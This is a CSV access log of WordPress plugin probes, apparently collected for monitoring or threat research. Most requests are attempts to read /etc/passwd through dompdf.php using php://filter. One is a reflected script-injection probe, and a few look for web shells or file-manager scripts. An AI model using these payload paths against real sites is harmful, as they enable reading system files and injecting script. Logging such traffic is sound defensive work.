"ip","time","path","useragent","source"
"162.158.88.48","2025-09-28T01:15:40Z","/wp-content/plugins/age-verification/age-verification.php","Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36","plugin_php"
"172.71.81.196","2025-09-28T01:15:41Z","/wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Teak/4.3.1 Version/17.4.1 Safari/605.1.15","plugin_php"
"108.162.226.226","2025-09-28T01:15:41Z","/wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","plugin_php"
"162.158.106.126","2025-09-28T01:15:41Z","/wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0) AppleWebKit/616.3 (KHTML, like Gecko) Version/17.5.22 Safari/616.3","plugin_php"
"172.69.176.74","2025-09-28T01:15:41Z","/wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E","Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36","plugin_php"
"104.23.175.16","2025-09-28T01:15:41Z","/wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0","plugin_php"
"172.69.176.75","2025-09-28T01:15:41Z","/wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_7; en) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.7 Safari/605.1.15","plugin_php"
"172.69.166.105","2025-09-28T01:15:41Z","/wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 HeyTapBrowser/45.11.0.1.1 Chrome/91.0.4472.88","plugin_php"
"172.69.166.105","2025-09-28T01:15:42Z","/wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36","plugin_php"
"162.158.162.115","2025-09-28T01:28:53Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.188.107","2025-09-28T02:15:10Z","//wp-content/plugins/fix/up.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36","plugin_php"
"172.68.164.60","2025-09-28T02:33:14Z","/wp-content/plugins/age-verification/age-verification.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0","plugin_php"
